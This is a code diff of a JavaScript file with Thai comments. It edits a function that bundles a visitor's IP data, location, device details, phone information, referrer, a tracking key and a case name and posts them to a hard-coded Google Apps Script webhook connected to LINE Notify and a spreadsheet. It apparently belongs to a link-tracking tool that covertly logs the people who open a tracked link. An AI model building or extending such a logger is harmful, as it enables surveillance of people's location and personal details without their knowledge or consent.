@@ -462,23 +462,26 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ฟังก์ชันส่งข้อมูลไปยัง LINE Notify ผ่าน API
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  // สร้างข้อความละเอียด
+  // สร้างข้อความละเอียด (ใช้ trackingKey และ caseName แยกกัน)
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
   const webhookUrl = 'https://script.google.com/macros/s/AKfycbxBSNwlPZ4xdIFbdmdXsW6UxRDjTRREm4qkxhjguJGhRxFBcPyZ_C9A2OaRzc6sNtBT_A/exec';
 
-  // เตรียมข้อมูลสำหรับส่ง
+  // เตรียมข้อมูลสำหรับส่งไปยัง Google Apps Script
+  // รวม caseName และ trackingKey สำหรับการบันทึกลง Sheet (ตามรูปแบบเดิม)
+  const sheetTrackingValue = (caseName && caseName !== "ไม่มีค่า" ? caseName : "") + (trackingKey !== "ไม่มีค่า" ? trackingKey : "");
+
   const dataToSend = {
-    message: detailedMessage,
+    message: detailedMessage, // ข้อความสำหรับ Line Notify (มี caseName และ trackingKey แยกกัน)
     timestamp: timestamp,
     location: location,
     ip: ipData,
     deviceInfo: deviceData,
-    phoneInfo: phoneInfo, // เพิ่มข้อมูลเบอร์โทรศัพท์
+    phoneInfo: phoneInfo,
     referrer: referrer,
-    trackingKey: trackingKey, // เพิ่ม tracking key ในข้อมูลที่ส่งไป
-    caseName: caseName // เพิ่มชื่อเคสในข้อมูลที่ส่งไป
+    trackingKey: sheetTrackingValue, // ส่งค่าที่รวมแล้วไปยัง Apps Script สำหรับ Sheet
+    caseName: caseName // ส่ง caseName แยกต่างหาก (Apps Script อาจใช้หรือไม่ก็ได้)
   };
 
   // ส่งข้อมูล
